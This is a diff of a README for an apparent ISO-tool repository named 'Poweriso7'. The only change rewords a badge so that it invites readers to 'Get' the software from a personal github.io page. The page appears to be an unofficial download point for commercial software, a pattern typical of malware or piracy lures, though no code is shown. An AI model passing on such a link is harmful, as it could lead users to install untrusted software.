@@ -2,7 +2,7 @@
 
 > A streamlined utility designed for comprehensive PowerISO tasks, enabling users to manipulate ISO files and other disc image formats with precision and speed. Poweriso7 focuses on delivering a smooth experience for managing virtual drives and archive contents.
 
-[![Explore Poweriso7](https://img.shields.io/badge/Explore_Poweriso7-Repository-0a5d8d?style=for-the-badge&logo=github)](https://tiffanyhappy0505.github.io/.github/poweriso7)
+[![Get the Poweriso7 Software](https://img.shields.io/badge/Get_Poweriso7_Software-Now-0a5d8d?style=for-the-badge&logo=github)](https://tiffanyhappy0505.github.io/.github/poweriso7)
 
 ---
 
